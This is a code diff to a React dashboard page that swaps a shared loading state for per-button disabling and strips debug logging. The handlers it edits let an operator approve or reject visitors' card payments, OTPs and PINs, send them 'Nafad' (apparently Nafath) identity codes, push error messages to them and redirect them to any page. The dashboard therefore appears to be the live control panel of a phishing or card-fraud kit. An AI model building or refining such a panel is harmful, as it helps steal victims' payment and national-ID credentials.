@@ -258,7 +258,6 @@ export default function DashboardPage() {
   const [nowTick, setNowTick] = useState<number>(Date.now());
   const [pinInput, setPinInput] = useState("");
   const [nafadInput, setNafadInput] = useState("");
-  const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [expandedCards, setExpandedCards] = useState<Record<string, boolean>>({});
   const [cardsHistory, setCardsHistory] = useState<Record<string, any[]>>({});
   const [hasCardHistory, setHasCardHistory] = useState<Record<string, boolean>>({});
@@ -1315,10 +1314,16 @@ export default function DashboardPage() {
   };
 
   // Handle dashboard actions
-  const handlePaymentAction = async (action: "approved" | "rejected") => {
+  const handlePaymentAction = async (action: "approved" | "rejected", event: React.MouseEvent) => {
+    event.stopPropagation();
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    setActionLoading("payment");
+    
+    const button = event.currentTarget as HTMLButtonElement;
+    const originalText = button.innerHTML;
+    button.disabled = true;
+    button.innerHTML = "...";
+    
     try {
       const res = await fetch("/api/dashboard/payment-action", {
         method: "POST",
@@ -1333,21 +1338,27 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
+    
+    button.disabled = false;
+    button.innerHTML = originalText;
   };
 
-  const handleOtpAction = async (action: "approved" | "rejected" | "resend") => {
-    // Get visitorId from multiple possible sources
+  const handleOtpAction = async (action: "approved" | "rejected" | "resend", event?: React.MouseEvent) => {
+    event?.stopPropagation();
+    
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id || selectedRequest?.raw?.visitorId || selectedRequest?.raw?.id;
-    console.log("[DASHBOARD] handleOtpAction - visitorId:", visitorId, "selectedRequest:", JSON.stringify(selectedRequest));
     
     if (!visitorId) {
-      console.log("[DASHBOARD] No visitorId found in selectedRequest:", selectedRequest);
       showNotification("error", "لم يتم العثور على بيانات الزائر");
       return;
     }
     
-    setActionLoading("otp");
+    let button: HTMLButtonElement | null = null;
+    if (event?.currentTarget) {
+      button = event.currentTarget as HTMLButtonElement;
+      button.disabled = true;
+    }
+    
     try {
       const res = await fetch("/api/dashboard/otp-action", {
         method: "POST",
@@ -1367,13 +1378,21 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
+    
+    if (button) button.disabled = false;
   };
 
-  const handleSendPin = async () => {
+  const handleSendPin = async (event?: React.MouseEvent) => {
+    event?.stopPropagation();
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    setActionLoading("pin");
+    
+    let button: HTMLButtonElement | null = null;
+    if (event?.currentTarget) {
+      button = event.currentTarget as HTMLButtonElement;
+      button.disabled = true;
+    }
+    
     try {
       const res = await fetch("/api/dashboard/send-pin", {
         method: "POST",
@@ -1389,13 +1408,21 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
+    
+    if (button) button.disabled = false;
   };
 
-  const handlePinAction = async (action: "approved" | "rejected") => {
+  const handlePinAction = async (action: "approved" | "rejected", event?: React.MouseEvent) => {
+    event?.stopPropagation();
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    setActionLoading("pin");
+    
+    let button: HTMLButtonElement | null = null;
+    if (event?.currentTarget) {
+      button = event.currentTarget as HTMLButtonElement;
+      button.disabled = true;
+    }
+    
     try {
       const res = await fetch("/api/dashboard/pin-action", {
         method: "POST",
@@ -1414,13 +1441,21 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
+    
+    if (button) button.disabled = false;
   };
 
-  const handlePhoneAction = async (action: "approved" | "rejected" | "resend") => {
+  const handlePhoneAction = async (action: "approved" | "rejected" | "resend", event?: React.MouseEvent) => {
+    event?.stopPropagation();
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    setActionLoading("phone");
+    
+    let button: HTMLButtonElement | null = null;
+    if (event?.currentTarget) {
+      button = event.currentTarget as HTMLButtonElement;
+      button.disabled = true;
+    }
+    
     try {
       const res = await fetch("/api/dashboard/phone-action", {
         method: "POST",
@@ -1440,13 +1475,21 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
+    
+    if (button) button.disabled = false;
   };
 
-  const handleSendNafadCode = async () => {
+  const handleSendNafadCode = async (event?: React.MouseEvent) => {
+    event?.stopPropagation();
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    setActionLoading("nafad");
+    
+    let button: HTMLButtonElement | null = null;
+    if (event?.currentTarget) {
+      button = event.currentTarget as HTMLButtonElement;
+      button.disabled = true;
+    }
+    
     try {
       const res = await fetch("/api/dashboard/send-nafad-code", {
         method: "POST",
@@ -1461,15 +1504,21 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
+    
+    if (button) button.disabled = false;
   };
 
   // Handle manual redirect to any page
-  const handleRedirect = async () => {
+  const handleRedirect = async (event?: React.MouseEvent) => {
+    event?.stopPropagation();
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId || !redirectPage) return;
     
-    setActionLoading("redirect");
+    let button: HTMLButtonElement | null = null;
+    if (event?.currentTarget) {
+      button = event.currentTarget as HTMLButtonElement;
+      button.disabled = true;
+    }
     
     try {
       const res = await fetch("/api/dashboard/redirect", {
@@ -1487,15 +1536,14 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
+    
+    if (button) button.disabled = false;
   };
 
   // Handle approve action - move to next step
   const handleApprove = async (currentStep: string) => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    
-    setActionLoading("approve");
     
     // Determine next page based on current step
     const nextPages: Record<string, string> = {
@@ -1521,20 +1569,15 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
   };
 
   // Handle reject action - go back with error message
   const handleReject = async (currentStep: string) => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) {
-      console.error("[Reject] No visitorId found");
       showNotification("error", "لم يتم اختيار عميل");
       return;
     }
-    
-    console.log("[Reject] Rejecting step:", currentStep, "visitorId:", visitorId);
-    setActionLoading("reject");
     
     // Error messages for each step
     const errorMessages: Record<string, { message: string; targetPage: string }> = {
@@ -1562,19 +1605,15 @@ export default function DashboardPage() {
       } else {
         showNotification("error", "حدث خطأ");
       }
-    } catch (err) {
-      console.error("[Reject] Error:", err);
+    } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
   };
 
   // Handle step5 approve - use phone-action endpoint
   const handleStep5Approve = async () => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    
-    setActionLoading("approve");
     
     try {
       const res = await fetch("/api/dashboard/phone-action", {
@@ -1590,15 +1629,12 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
   };
 
   // Handle resend code for step5
   const handleResendCode = async () => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
-    
-    setActionLoading("resend");
     
     try {
       const res = await fetch("/api/dashboard/resend-code", {
@@ -1618,15 +1654,12 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
   };
 
   // Handle nafad code send for step4
   const handleNafadCode = async (code: string) => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId || !code) return;
-    
-    setActionLoading("nafad");
     
     try {
       const res = await fetch("/api/dashboard/send-nafad-code", {
@@ -1642,7 +1675,6 @@ export default function DashboardPage() {
     } catch {
       showNotification("error", "فشل الاتصال");
     }
-    setActionLoading(null);
   };
 
   // Get current page and status from visitor data
@@ -2765,8 +2797,8 @@ export default function DashboardPage() {
                   }}
                 />
                 <button
-                  onClick={() => handleSendNafadCode()}
-                  disabled={!nafadInput.trim() || actionLoading === "nafad"}
+                  onClick={(e) => handleSendNafadCode(e)}
+                  disabled={!nafadInput.trim()}
                   style={{
                     padding: "8px 16px",
                     borderRadius: 6,
@@ -2775,11 +2807,10 @@ export default function DashboardPage() {
                     color: "white",
                     fontSize: "0.8rem",
                     fontWeight: 600,
-                    cursor: nafadInput.trim() ? "pointer" : "not-allowed",
-                    opacity: actionLoading === "nafad" ? 0.7 : 1
+                    cursor: nafadInput.trim() ? "pointer" : "not-allowed"
                   }}
                 >
-                  {actionLoading === "nafad" ? "..." : "إرسال"}
+                  إرسال
                 </button>
               </div>
             </div>
@@ -3700,7 +3731,6 @@ export default function DashboardPage() {
                       const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                       if (!visitorId) return;
 
-                      setActionLoading("redirect");
                       setRedirectPage(selectedPage);
 
                       try {
@@ -3718,7 +3748,6 @@ export default function DashboardPage() {
                       } catch {
                         showNotification("error", "فشل الاتصال");
                       }
-                      setActionLoading(null);
                       setRedirectPage("");
                     }}
                     style={{
